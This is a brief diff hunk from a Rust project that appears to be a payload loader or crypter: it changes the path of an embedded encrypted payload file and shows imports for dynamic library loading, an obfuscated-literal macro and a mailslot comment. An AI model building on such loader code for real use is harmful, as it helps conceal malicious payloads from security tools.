@@ -7,7 +7,7 @@ use crate::utils::{load_library, get_proc_address};
 use rustcrypt_ct_macros::obf_lit_bytes;
 
 pub fn load_payload() -> Result<Vec<u8>, String> {
-    const ENCRYPT_DATA: &'static [u8] = include_bytes!("../encrypt.bin");
+    const ENCRYPT_DATA: &'static [u8] = include_bytes!("../../output/encrypt.bin");
     let encrypted_data = ENCRYPT_DATA.to_vec();
 
     // Generate random mailslot name
